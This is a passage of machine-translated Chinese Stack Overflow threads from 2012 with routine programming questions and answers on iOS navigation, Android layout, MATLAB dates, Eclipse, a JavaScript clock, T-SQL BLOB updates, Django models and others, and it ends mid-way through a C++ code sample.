我也认为这不会解决你的整个问题。您可能会收到一条错误消息，说两次快速弹出和推送可能会使 NavigationController 无效。
为了解决这个问题，您可以将 NavigationController 推送到第二个视图控制器的 viewDidDissappear 方法中，或者将其推送到主视图控制器的 viewDidAppear 方法中（项目列表）。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-08-06T01:19:03.213

完成您想要做的事情的一种简单方法是将一些简单的逻辑构建到您的主根视图控制器 -(void)viewWillAppear 方法中，并使用委托回调来翻转逻辑开关。基本上是对根控制器的“反向引用”。这是一个简单的例子。

主根控制器（考虑这个控制器 a） - 好吧，称之为 controllerA 设置一个属性来跟踪跳转状态

```
@property (nonatomic) BOOL jumpNeeded; 
```

设置一些逻辑

```
- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    self.jumpNeeded ? NSLog(@"jump needed") : NSLog(@"no jump needed");

    if (self.jumpNeeded) {
        NSLog(@"jumping");
        self.jumpNeeded = NO;
        [self performSegueWithIdentifier:@"controllerC" sender:self];
    }   
} 
```

Now, in your main root controller,when a tableview row is selected do something like this when pushing to controllerB in your tableView did select method

```
[self performSegueWithIdentifer@"controllerB" sender:self]; 
```

然后实现你的准备 segue 方法

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

  //setup controller B
  if([segue.identifier isEqualTo:@"controllerB"]){
    ControllerB *b = segue.destinationViewController;
    b.delegate = self;  //note this is the back reference
  }

  //implement controller c here if needed
} 
```

现在转到controllerB，您需要设置一个名为“delegate”的属性来保存反向引用，并且您需要从根控制器导入头文件

```
#import "controllerA"

@property (nonatomic,weak) controllerA *delegate; 
```

然后就在你弹回控制器A之前，你设置了标志

```
 self.delegate.jumpNeeded = YES;
    [self.navigationController popViewControllerAnimated:YES]; 
```

就是这样。您不必对控制器C 做任何事情。还有其他一些方法可以做，但这对于您的需求来说非常简单。希望它对你有帮助。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2014-09-10T17:08:34.533

根据我们在应用程序中使用的 Dave DeLong 的回答在 UINavigationController 上共享一个类别，以保持后退按钮始终按要求工作。

```
@implementation UINavigationController (PushNewAndClearNavigationStackToParent)

- (void) pushNewControllerAndClearStackToParent:(UIViewController*)newCont animated:(BOOL)animated
{
    NSArray *viewControllers = self.viewControllers;
    NSMutableArray *newViewControllers = [NSMutableArray array];

    // preserve the root view controller
    [newViewControllers addObject:[viewControllers firstObject]];
    // add the new view controller
    [newViewControllers addObject:newCont];
    // animatedly change the navigation stack
    [self setViewControllers:newViewControllers animated:animated];
}

@end 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-06-17T07:39:20.237

```
NSArray *viewControllers = self.navigationController.viewControllers;
NSMutableArray *newViewControllers = [NSMutableArray array];

// preserve the root view controller
for(int i = 0; i < [viewControllers count];i++){
    if(i != [viewControllers count]-1)
        [newViewControllers addObject:[viewControllers objectAtIndex:i]];
}
// add the new view controller
[newViewControllers addObject:conversationViewController];
// animatedly change the navigation stack
[self.navigationController setViewControllers:newViewControllers animated:YES]; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-05T23:40:36.557

我认为这是不可能的，因为弹回会释放所有内容。

我认为更好的方法是将您的数据放在模型单例类中，弹出到 rootviewcontroller 并监听弹出结束。然后检查模型上是否存储了一些数据，以便知道是否应该推送新的视图控制器。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-04-21T03:57:09.670

我以 Dave 的回答为灵感，为 Swift 制作了这个：

```
let newViewControllers = NSMutableArray()
newViewControllers.addObject(HomeViewController())
newViewControllers.addObject(GroupViewController())
let swiftArray = NSArray(array:newViewControllers) as! Array<UIViewController>
self.navigationController?.setViewControllers(swiftArray, animated: true) 
```

1.  用你想要的底视图控制器替换 HomeViewController()
2.  用你想要的顶视图控制器替换 GroupViewController()

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-07-29T21:16:31.493

如果您想做的是在同一个导航控制器中以任何方式导航...您可以访问 navigationStack AKA viewControllers，然后按照您想要的顺序设置 viewcontrollers，或者添加或删除一些...这是最干净的和本地的方式来做到这一点。

```
 UINavigationController* theNav = viewControllerToDismiss.navigationController;
        UIViewController* theNewController = [UIViewController new];
        UIViewController* rootView = theNav.viewControllers[0];
        [theNav setViewControllers:@[
                                     rootView,
                                     theNewController
                                     ] animated:YES]; 
```

做任何必要的验证，这样你就不会得到任何异常。

# ios - 调整图像大小保持纵横比

> ID：11820941
> 
> 赞同：3
> 
> 时间：2012-08-05T23:20:04.123
> 
> 标签：ios, image-processing, opencv

我正在尝试解决我遇到的这个问题，但我觉得必须有一个更简单、更容易的解决方案。这是问题所在：

*   我有一个宽度：**cWidth**和高度：**cHeight**的画布。
*   我有一个宽度为**iWidth**和高度**iHeight**的图像。（图像比画布大，无论是宽度还是高度）
*   我有一个宽度为**tWidth**和高度**为 tHeight**的矩形。

图像现在在画布内。我可以尽可能地放大或缩小。

目标是将矩形映射到画布上。这是一张可以更好地解释它的图像： ![在此处输入图像描述](../Images/0f8e2396be20f8cf78160ef2eacd92f2.png)

当然，映射的矩形也需要居中（垂直和水平）。

最好的方法是什么？

如果有人想要，我可以发布我的解决方案，但它很长而且（有点尴尬 IMO），这就是我问这个问题的原因。但是请询问，我会在这里发布。

谢谢

**澄清一下：**我需要以矩形区域出现在中间的方式重新定位和调整**原始图像的大小。**

# matlab - 不稳定的“日期”代码，有时有效，有时无效

> ID：11820942
> 
> 赞同：0
> 
> 时间：2012-08-05T23:20:15.187
> 
> 标签：matlab, date

我有一个非常简单的代码如下，

```
[Y M] = datevec(datenum({'199812';'201203'},'yyyymm'));   
    % Y returns the # of years,
    % M is the # of months other                            
    % than a full year                                    
mns = diff([Y M])*[12;1];                                 
    % mns is the total # of months
    % between 12/1998 to 03/2012                          
Monthdate = cellstr(datestr(datenum(1998,12+(0:mns)',1),'yyyymm')); 
    % Returns cells as
    %199812,199901,199902,                                        
    %199003,...201203 
```

有时这段代码运行良好。有时它会返回，

```
Error using datenum (line 181)
DATENUM failed.

Caused by:
    Error using dtstr2dtnummx
    Failed on converting date string to date number. 
```

怎么可能不稳定？有没有办法让它稳定？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-03T01:52:53.830

我有完全相同的问题（R2012a） - 它真的只是似乎是一个不稳定的功能。每当它开始发生时，我只需重新启动 Matlab，它就会再次正常工作一段时间。

# android - Android：根据屏幕尺寸以编程方式调整尺寸

> ID：11820944
> 
> 赞同：6
> 
> 时间：2012-08-05T23:20:41.470
> 
> 标签：android, android-layout

获取设备的宽度和高度并相应地以编程方式设置图像/按钮大小是否是一个坏习惯。

我发现使用不同的文件夹进行布局和密度是不准确的，因为它在某些设备上给了我奇怪的结果（除了不准确之外）

感谢您的经验。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T07:10:28.347

是的，为所有支持的 android 屏幕进行布局是一件非常复杂的事情。市场上有很多屏幕分辨率可供选择。

一旦我做了一个演示，它就对我有用。我制作了一个高度和宽度相同的按钮。现在我已经根据它看起来很完美的一个屏幕设置了它所需的高度和宽度。

之后，我计算了使其在该屏幕中成为可能所需的像素，并基于此将其应用于所有屏幕。

现在它适用于任何密度和分辨率的所有设备。

因此，如果有任何视图在运行时生成并且您想设置它的高度和宽度，那么最好的方法是计算它的高宽比并使用它。

希望它会帮助你。

享受编码。. . .

:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T23:29:48.667

好吧，在大多数情况下，您的布局已经或将变得复杂，并且很难以编程方式计算位置。

维护它也是一个缺点，因为您将无法使用界面的东西（图形布局等），并且其他人或您自己将不会像他们看到的那样理解计算XML 中的视图。重组、改变某个位置可能会很痛苦。

您还将经常使用具有固定大小的位图，如果您以编程方式计算尺寸并拉伸它们看起来不会很好。至少您需要不同的位图集并相应地加载。

例如，如果您使用具有规则的相对布局（例如在父级底部的 / 对齐等）、具有权重的线性布局和倾斜（与密度无关的像素），它会有所帮助。只有在无法以其他方式实现时，才应该进行程序化布局。或者在某些情况下，它真的让事情变得更容易。

# c++ - GLUT 显示桌面的一部分而不是我的代码中的内容

> ID：11820949
> 
> 赞同：0
> 
> 时间：2012-08-05T23:22:18.413
> 
> 标签：c++, glut

上周，我尝试了一些在阅读 GLUT 教程时发现的示例，一切都运行良好。

现在，当我重试这些相同的示例时，我得到了一个奇怪的行为：我的 GLUT 窗口显示了位于窗口所在位置的桌面部分（因此，如果 GLUT 窗口从 (100,100) 开始并且大小为 500 像素 x 500 像素，它显示从 (100,100) 开始到 (600,600) 结束的桌面部分。

我上周测试的以下示例应显示黑色背景上的铁丝茶壶。我想知道我的代码是否有问题（因为我不记得更改其中的任何内容）或者问题是否来自未正确链接的库，或者是否是我不知道的其他问题。

```
#include <GL/glut.h>

void displayFunc(void);

int glutWindow;

int main(int argc, char** argv){
    glutInit(&argc, argv);

    glutInitDisplayMode(GLUT_RGBA | GLUT_SINGLE);

    // define the size
    glutInitWindowSize(500,500);

    // the position where the window will appear
    glutInitWindowPosition(100,100);

    glutWindow = glutCreateWindow("UITest");
    glClearColor(0.0, 0.0, 0.0, 0.0);

    glutDisplayFunc(displayFunc);

    glutMainLoop();

    return EXIT_SUCCESS;
}

void displayFunc(void){
    glClear(GL_COLOR_BUFFER_BIT);

    glutWireTeapot(0.5);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T05:49:42.147

您需要`glFlush()`在`displayFunc()`.

# networking - Heroku 上的安全组和 UDP

> ID：11820950
> 
> 赞同：2
> 
> 时间：2012-08-05T23:22:21.627
> 
> 标签：networking, heroku

有没有人体验过在 Heroku 上运行多个协作应用程序？例如，一个管理应用程序来管理另一个应用程序；或观察另一个应用程序的统计服务器？

在 Amazons 的 EC2 平台上，您可以使用安全组来限制对服务器的访问，在您的应用程序或服务器实例之间创建一个虚拟网络。在 Heroku 上有没有这样的方法可以做到这一点？如果是这样，您可以打开 UDP 和 TCP 连接吗？

谢谢

罗比

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T05:06:29.837

@elithrar 的评论是正确的。要在应用程序之间进行通信，您要么需要定义 API，要么使用共享资源。例如，您可以通过手动将 DATABASE_URL 从一个应用程序复制并粘贴到另一个应用程序来让 2 个应用程序连接到同一个数据库。这有一个缺点，如果我们需要滚动凭据（非常罕见），您手动复制的配置会中断。

相同的模式可用于任何附加组件，例如[https://addons.heroku.com/redistogo](https://addons.heroku.com/redistogo)或[https://addons.heroku.com/iron_mq](https://addons.heroku.com/iron_mq)以在两个应用程序之间共享消息总线或队列。

# java - Eclipse IDE 范围突出显示？

> ID：11820952
> 
> 赞同：15
> 
> 时间：2012-08-05T23:22:37.040
> 
> 标签：java, ide, scope, highlighting, bluej

当我第一次学习 Java 时，我使用的是一个名为“BlueJ”的 IDE。它有一个称为“范围突出显示”的功能，可以很容易地阅读代码块。现在我已经离开 BlueJ 并开始使用 Eclipse。我目前正在根据自己的喜好定制 Eclipse，并希望在 Eclipse 中使用这个 Scope Highlighting 功能。

我到处寻找有关如何做到这一点的答案，但我找不到任何指向在 Eclipse 中执行此操作的解决方案的信息。

这是一张图片来演示 Scope Highlighting 的样子：

![注意每个方法背后的背景颜色](../Images/53e87b3a7d6ad0469c49ab67b8ccc782.png)

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-02-04T16:05:26.027

我认为对你来说最好的选择是 EditBox，一个适用于 Eclipse 的范围突出插件：http: [//editbox.sourceforge.net/](http://editbox.sourceforge.net/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-06T00:21:06.967

我很担心你能得到的最接近的是**Shift + Alt + arrow_up**

它正在选择更广泛的代码块。按这几次会给你非常相似的结果，你正在寻找什么。我经常使用它。它很有用，也可用于重构。

编辑：正如@j2emanue 所说：[*您只需双击分隔符（如括号），它将突出显示整个范围。*](https://stackoverflow.com/a/15435400/575659)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-15T14:49:50.220

您可以使用 Shift + Alt + arrow_up 但很多人没有意识到您只需双击分隔符（如括号），它将突出显示整个范围。例如，尝试双击您的 if 语句括号并观看 eclipse 突出显示整个范围。它适用于任何分隔符。所以你也可以使用括号。

作为旁注：如果您使用 intelliji 结帐此插件效果很好： [https ://github.com/izhangzhihao/intellij-rainbow-brackets#screenshots](https://github.com/izhangzhihao/intellij-rainbow-brackets#screenshots)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-08-07T23:47:43.167

这并不完全是您所追求的，但您可以将光标放在一个方法中，然后单击工具栏上的 Show Source Of Selected Element only 按钮。你的编辑器被简化为这种方法。再次单击并返回整个文件。 ![在此处输入图像描述](../Images/3d1d4a6ff3d59311f70347ee4197c31c.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T23:41:53.403

我怀疑 eclipse 确实与 blue j 具有相同的功能。我能给你的最好建议是根据自己的喜好更改主题，这将使您能够轻松选择和突出显示代码块......并自定义主题，去[http://eclipsecolorthemes.org/](http://eclipsecolorthemes.org/)。……

如果您仍然有问题，请访问[http://codejava.co.uk/contact.html](http://codejava.co.uk/contact.html)并发送您的电子邮件。如果需要，您可以创建一个虚拟的，然后我将向您发送我用于 Eclipse 主题的 XML 文件。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-22T22:49:10.830

Bracketeer 可以做到这一点吗？它是一个eclipse插件..

[http://marketplace.eclipse.org/content/bracketeer-java-jdt#.UK6sY4fAdLc](http://marketplace.eclipse.org/content/bracketeer-java-jdt#.UK6sY4fAdLc)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-02-12T18:46:43.590

也许你也会喜欢 VSCode 扩展“Blockman”。它突出显示基于花括号/方括号/圆括号、html/xml 标记和 Python/Yaml 缩进的嵌套代码块。（我是 Blockman 的作者）。. [https://i.ibb.co/31F0rm9/vscode-blockman-intro-leodevbro-extension3.png](https://i.ibb.co/31F0rm9/vscode-blockman-intro-leodevbro-extension3.png) 。.

# android - 通过 content://sms/ 获取每条短信的电话号码

> ID：11820956
> 
> 赞同：0
> 
> 时间：2012-08-05T23:23:39.333
> 
> 标签：android, sms

我编写了以下代码，以获取用户和数字之间的整个对话：

```
Uri SMS_INBOX = Uri.parse("content://sms/");
        String selection = "thread_id = " + thread_id;
        final String[] projection = new String[] { "*" };
        Cursor c = getContentResolver().query(SMS_INBOX, projection, selection,null, "date");

        startManagingCursor(c);

        String[] body = new String[c.getCount()];
        String[] address = new String[c.getCount()];
        if (c.moveToFirst()) {
            for (int j = 0; j < c.getColumnCount(); j++)
                Log.w("ColumnName", c.getColumnName(j));
            for (int i = 0; i < c.getCount(); i++) {
                body[i] = c.getString(c.getColumnIndexOrThrow("body")).toString();
                address[i] = c.getString(c.getColumnIndexOrThrow("address")).toString();
                Log.d("address-" + i, address[i]);
                Log.d("body-" + i, body[i]);
                String subject =  c.getString(c.getColumnIndexOrThrow("_id")).toString();
                Log.d("_id-" + i, subject);
                String thread =  c.getString(c.getColumnIndexOrThrow("thread_id")).toString();
                Log.d("thread_id-" + i, subject);
                Log.d("----", "----");

                c.moveToNext();
            }

        } 
```

通过此代码，我得到了对话中的所有消息。问题是，我不知道哪个号码正在发送哪个消息。如果我得到“地址”列，它总是返回相同的号码（实际上它只返回对方的号码），所以我无法记录我刚刚通过此代码收到的消息是由用户发送还是另一个号码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:05:01.890

该列将始终仅提供第二个人编号。如果要区分已发送消息和已接收消息，则必须使用“类型”列。

```
body[i] = c.getString(c.getColumnIndexOrThrow("body")).toString();

if(c.getString(c.getColumnIndex("type")).equalsIgnoreCase("1")){

                // sms received

                msg_state[i]=1;

             }

              else {
                //sms sent
                msg_state[i]=0;

             } 
```

否 您可以轻松识别发送的短信和收到的短信。

# ruby-on-rails - 如何在 ruby on rails 中为我的对象设置初始值

> ID：11820957
> 
> 赞同：-3
> 
> 时间：2012-08-05T23:23:45.770
> 
> 标签：ruby-on-rails, ruby

我对 Rails 还是很陌生，并且正在开发一个基本的应用程序并且遇到了一个问题，我似乎无法解决这个问题，抱歉，如果这个问题已经得到解答，但搜索并没有给我任何结果。

基本上我正在创建一个应用程序，对某人的所有衣服进行分类，现在主页是他们记录的所有内容的索引页面，每张图片都链接到显示更多信息的展示页面。我想使用 AJAX 将该显示页面带到主索引页面的一侧。我正在研究另一个教程来解决这个问题，但遇到了问题。在我的索引页面的初始加载中，我需要为该显示页面定义一个变量，以便可以使用部分呈现它，但我不能使用 find(params[:id]) 因为用户没有选择什么都没有。所以我的问题是如何将初始值设置为目录中的第一项或不显示任何内容，然后当有人单击链接时，侧边栏会显示对这件衣服的更详细描述。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:39:31.750

```
@object = params[:id] ? MyModel.find(params[:id]) : MyModel.first 
```

但我认为应用程序的设计存在一些问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:37:29.583

听起来您可以像往常一样打印容器元素，但在生成页面时将其留空。或者，通过 CSS 隐藏它。然后，当您使用 AJAX 加载其内容时，将其设置为可见或正常填充它。

或者，如果您真的想将其设置为目录（或任何`ActiveRecord`）中的第一项，您可以使用`.first`eg `Products.first`，并使用该值填充其初始内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-06T05:46:26.047

使用红宝石宝石“PJAX”可能会有一些运气。[这是一个屏幕截图，](http://railscasts.com/episodes/294-playing-with-pjax)向您展示如何获得所需的 AJAX 侧边栏。祝你好运

# javascript - 从自定义按钮打开自定义对象新建/编辑页面并使用 JavaScript 传递参数

> ID：11820963
> 
> 赞同：0
> 
> 时间：2012-08-05T23:24:51.290
> 
> 标签：javascript, salesforce

在机会页面上有一个自定义按钮。自定义对象和机会页面配置了新页面和编辑页面而不是 VF 的页面布局。我想实现以下目标：1）第一次单击该按钮时希望它打开自定义对象的“新”页面. 第二次打开它应该打开“编辑”页面。2）我还希望能够将 2 个或更多参数从机会页面传递到新/编辑页面，主要用于新页面。

3) 在自定义对象页面上的“保存”上，希望它重定向到机会视图页面。

请你能给我提供示例 javascript 或更好的方法。感谢以下 Javascript，我遇到了问题：

```
var oppId = "{!Opportunity.Id}"; 
If ({!Opportunity.PQQ__c})
{!URLFOR($Action.PQQ__c.New, null,
[

"PQQ__c.Name"="{!Opportunity.Name}",
"PQQ__c.Opportunity__c"="{!Opportunity.Id}",
"save"="1",
 "retURL"=URLFOR($Action.Opportunity.View, oppId)
],
true)}

else{{!URLFOR($Action.PQQ__c.Edit, null,
[

"PQQ__c.Name"="{!Opportunity.Name}",
"PQQ__c.Opportunity__c"="{!Opportunity.Id}",
"save"="1",
"retURL"=URLFOR($Action.Opportunity.View, oppId)
],
true)} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:14:35.353

像这样传递参数：

```
window.location = "apex/yourCustomPage?param1={!Opportunity.Id}&param2={!Opportunity.Name}"; 
```

在 visualforce 页面上，您可以像这样直接访问这些参数：

```
{!$CurrentPage.parameters.param1} 
```

在控制器中：

```
if (ApexPages.currentPage().getParameters().containsKey('param1'))
{
    yourVar = ApexPages.currentPage().getParameters().get('param1');
} 
```

像这样打开新窗口：

```
window.open("apex/yourCustomPage?param1={!Opportunity.Id}&param2=edit"; 
```

# mongodb - MongoDB：将文件保存在内存而不是磁盘上

> ID：11820967
> 
> 赞同：0
> 
> 时间：2012-08-05T23:25:29.723
> 
> 标签：mongodb, memcached, redis

我可以使用像 Redis 或 Memcache 这样的 MongoDB 吗？

我的目标是将所有内容都保存在内存中并使其访问速度更快。我们已经在使用 MongoDB，但我们需要提高读取速度。

最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T23:27:54.533

您不能强制 mongodb 将所有内容保存在 RAM 中。它会将热数据和最近使用的数据保存在 RAM 中，并将其余数据分页。如果您无法承受页面错误的延迟，请使用 redis/memcached。

或者，或者，您可以将 mongodb 的数据目录放在 ram 磁盘上。这将有效地将所有内容保存在内存中，但您将复制一些数据（一个副本在 ram 磁盘上，另一个 - 在 mongo 的内存映射文件中）。

# javascript - 基于自定义时间的Javascript时钟

> ID：11820970
> 
> 赞同：0
> 
> 时间：2012-08-05T23:25:38.303
> 
> 标签：javascript, time

我正在使用下面的脚本，我想要做的是为脚本设置一个自定义时间并让它自动更新，而无需每次都重新设置时间。（我只想设置一次时间，并希望我的脚本跟踪时间并显示它）

当我运行脚本时，它显示： NaN:NaN:NaN AM

我的代码如下：

```
<div id="js_clock"> display clock here </div>

 <script language="javascript">
    function js_clock(clock_time)
    {   
         var clock_hours = clock_time.getHours();  
         var clock_minutes = clock_time.getMinutes();  
         var clock_seconds = clock_time.getSeconds();  
         var clock_suffix = "AM";     
         if (clock_hours > 11){
         clock_suffix = "PM";
         clock_hours = clock_hours - 12;
         }
         if (clock_hours == 0){
         clock_hours = 12;
         }

         if (clock_hours < 10){
         clock_hours = "0" + clock_hours;
         }

         if (clock_minutes < 10){
         clock_minutes = "0" + clock_minutes;
         }

         if (clock_seconds < 10){
         clock_seconds = "0" + clock_seconds;
         }

         var clock_div = document.getElementById('js_clock');
         clock_div.innerHTML = clock_hours + ":" + clock_minutes + ":" + clock_seconds + " " + clock_suffix;
         setTimeout("js_clock()", 1000);
    }

     var serverTime = new Date("09:20:50");
     js_clock(serverTime);
 </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:29:10.780

我认为您忘记将参数传递给`js_clock()`. 也许你应该这样做：

```
setTimeout(
    function() {
        //Call the function again updating seconds by 1
        js_clock(
            new Date(
                clock_time.getFullYear(), 
                clock_time.getMonth(), 
                clock_time.getDate(), 
                clock_time.getHours(), 
                clock_time.getMinutes(), 
                clock_time.getSeconds() + 1
             )
        );
    }, 
    1000
); 
```

**编辑**：我错过了可以通过单个函数调用完成的要点：

```
setTimeout(
    function() {
        js_clock(new Date(+clock_time + 1000));
    },
    1000
); 
```

该`+clock_time`语句将 Date 对象从 UNIX Epoch 转换为毫秒，因此更新时间就像求和 1000 毫秒一样简单。感谢用户 RobG ;-)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T23:33:27.993

您在创建日期时遇到问题，`new Date("09:20:50");`返回无效日期。

如果你想设置小时分钟和秒使用

```
new Date(year, month, day [, hour, minute, second, millisecond ]) 
```

或者看看[这里](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date)。

另外您忘记将日期传递给 setTimeout，请尝试：

```
setTimeout(function() {
    js_clock(new Date(/*pass hours minutes and seconds here*/))
}, 1000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T23:34:11.033

等待！刚刚意识到，这仍然没有显示正确的时间。错误消失了，但时间不是你要找的。

```
window.js_clock = function js_clock(clock_time) {
    var clock_hours = clock_time.getHours();
    var clock_minutes = clock_time.getMinutes();
    var clock_seconds = clock_time.getSeconds();
    var clock_suffix = "AM";
    if (clock_hours > 11) {
        clock_suffix = "PM";
        clock_hours = clock_hours - 12;
    }
    if (clock_hours === 0) {
        clock_hours = 12;
    }

    if (clock_hours < 10) {
        clock_hours = "0" + clock_hours;
    }

    if (clock_minutes < 10) {
        clock_minutes = "0" + clock_minutes;
    }

    if (clock_seconds < 10) {
        clock_seconds = "0" + clock_seconds;
    }

    var clock_div = document.getElementById('js_clock');
    clock_div.innerHTML = clock_hours + ":" + clock_minutes + ":" + clock_seconds + " " + clock_suffix;
    setTimeout("js_clock(new Date())", 1000);
}

var serverTime = new Date("09:20:50");
window.js_clock(serverTime);​ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-06T01:35:27.297

您的代码有一些严重的缺陷，例如以下。

*setTimeout*并不完全按照设置的时间间隔运行，但它会尽快运行，所以这个时钟会慢慢漂移，有时会漂移很多。

将字符串传递给 Date 并期望它被正确解析是有问题的。在 ECMA-262 ed 3 中，它完全依赖于实现，在 ES5 中，字符串必须是 ISO8601 长格式的自定义版本（但请注意，并非所有使用的浏览器都支持 ES5）。

最后，如果客户端很忙，该函数可能会运行几秒钟，因此时钟需要基于客户端时钟，然后根据时差进行调整。

以下函数完成上述所有操作。

```
<script type="text/javascript">
var customClock = (function() {

  var timeDiff;
  var timeout;

  function addZ(n) {
    return (n < 10? '0' : '') + n;
  }

  function formatTime(d) {
    return addZ(d.getHours()) + ':' +
           addZ(d.getMinutes()) + ':' +
           addZ(d.getSeconds());
  }

  return function (s) {

    var now = new Date();
    var then;

    // Set lag to just after next full second
    var lag = 1015 - now.getMilliseconds();

    // Get the time difference if first run
    if (s) {
      s = s.split(':');
      then = new Date(now);
      then.setHours(+s[0], +s[1], +s[2], 0);
      timeDiff = now - then;
    }

    now = new Date(now - timeDiff);

    document.getElementById('clock').innerHTML = formatTime(now); 
    timeout = setTimeout(customClock, lag);
  }
}());

window.onload = function() {
  customClock('09:20:50');
}

</script>

<div id="clock"></div> 
```

# sql - 如何使用 TSQL 在 SQL SERVER 中更新 BLOB

> ID：11820971
> 
> 赞同：10
> 
> 时间：2012-08-05T23:25:47.463
> 
> 标签：sql, sql-server, tsql, sql-update, blob

如何仅使用 TSQL（例如从 SSMS 而不使用 ADO.Net 或 Linq 等任何代码）更新 BLOB 字段？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-05T23:25:47.463

使用 TSQL 选择 BLOB 有两种方法：

```
SELECT * FROM OPENROWSET (BULK 'C:\Test\Test1.pdf', SINGLE_BLOB) a 
```

也：

```
SELECT BulkColumn FROM OPENROWSET (BULK 'C:\Test\Test1.pdf', SINGLE_BLOB) a 
```

请注意 FROM 子句后的相关名称，这是强制性的。

第二个版本可用于更新，如下例所示：

```
UPDATE MyTable 
SET blobField = 
   (SELECT BulkColumn FROM OPENROWSET (BULK 'C:\Test\Test1.pdf', SINGLE_BLOB) a) 
WHERE (CriteriaField = @criteria) 
```

[对于部分更新，可以使用此 MSDN 文章](http://msdn.microsoft.com/en-us/library/a1904w6t%28VS.80%29.aspx)中描述的 SET .WRITE mutator，语法如下：

```
UPDATE MyTable SET BlobField .WRITE (expression, @offset, @length) WHERE (CriteriaField = @criteria) 
```

请注意，WRITE mutator 只能用于 NON-NULL 字段。

事实上，这也可以用于进行完全更新（如果列不包含 NULL），方法是将 @offset 设置为 0 并将 @length 设置为 NULL（或实际长度），如下例所示：

```
DECLARE @tmp VARBINARY(MAX) --Change to the correct datatype here
SELECT @tmp = BulkColumn FROM OPENROWSET (BULK 'C:\Test\Test1.pdf', SINGLE_BLOB) a
UPDATE MyTable SET BlobField .WRITE (@tmp, 0, NULL) WHERE (CriteriaField = @criteria) 
```

# objective-c - 从简单的图像 ios 创建贝塞尔路径

> ID：11820974
> 
> 赞同：0
> 
> 时间：2012-08-05T23:26:13.983
> 
> 标签：objective-c, ios, image-processing, uibezierpath

我想根据我的应用程序中的图像生成并绘制一些贝塞尔路径。图像将非常简单（白色背景上的黑线），如下所示：

![http://i47.tinypic.com/otj2p2.jpg](../Images/74da359d102c8a9e1b6ba1f335988341.png)

有没有一种方法可以处理图像并根据黑线创建贝塞尔路径？我完全迷失在这里。

如果您想知道需要图像成为贝塞尔路径的原因，我将比较生成的贝塞尔路径与用户绘制的另一个贝塞尔路径（基本上是用户必须绘制的图片密码） .

如果有更好的方法来完成将图像与贝塞尔路径进行比较，我会全力以赴。或者，如果贝塞尔路径不是要走的路，请告诉我。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T23:33:43.327

为什么不反过来呢？

*   让用户绘制路径
*   使用核心图形从绘制的路径创建图像
*   将两个图像与 opencv 之类的框架进行比较

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-08-05T23:31:32.080

你不能用贝塞尔线做到这一点。那些是曲线，而你想要的是线条。如果您想解决控制点，尽管这个逆问题的解决方案是无限的，那么您必须设置贝塞尔曲线具有的控制点的数量。

# django - 创建使用 __init__ 的 django 模型？

> ID：11820976
> 
> 赞同：8
> 
> 时间：2012-08-05T23:26:32.953
> 
> 标签：django, django-models

假设我有一个名为 Hero 的类，其中有一个名为“name”的字段。每次创建一个新的 Hero 对象时，我都想追加`" is a hero"`. 我可以用`__init__`它吗？或者是否有我可以覆盖的特定于 django 的方法？

```
class Hero(modes.Model)
  name = models.CharField(max_length=100)
  def __init__(self, *args, **kwargs):
      name += " is a hero"
      super(Hero, self).__init__(*args, **kwargs) 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-06T02:13:12.910

如果“每次创建新的 Hero 对象”是指“每次在数据库中创建 Hero 记录”，那么不，您不想在`__init__`方法中执行此操作，因为任何时候都会调用 Hero对象是在 Python 中创建的，包括当您刚刚从数据库中获取现有记录时。

要执行您想要的操作，您可以使用 Django 的[post_save 信号](https://docs.djangoproject.com/en/dev/ref/signals/#post-save)，检查信号回调中`created`关键字参数是否为 True，如果是，则执行您的“创建时”逻辑。

或者，在某些情况下更直接和自然，您可以重写 Hero 的`save()`方法，如下所示：

```
def save(self, *args, **kwargs):
    if not self.pk:  # object is being created, thus no primary key field yet
       self.name += " is a hero"
    super(Hero, self).save(*args, **kwargs) 
```

请注意，Djagno 的`bulk_create`方法将跳过触发保存后信号或调用`save`.

# c++ - std::shared_ptr 和初始化列表

> ID：11820981
> 
> 赞同：26
> 
> 时间：2012-08-05T23:27:46.107
> 
> 标签：c++, c++11, clang, shared-ptr, initializer-list

std::shared_ptr 构造函数的行为不像我预期的那样：

```
#include <iostream>
#include <vector>

void func(std::vector<std::string> strings)
{
    for (auto const& string : strings)
    {
        std::cout << string << '\n';
    }
}

struct Func
{
    Func(std::vector<std::string> strings)
    {
        for (auto& string : strings)
        {
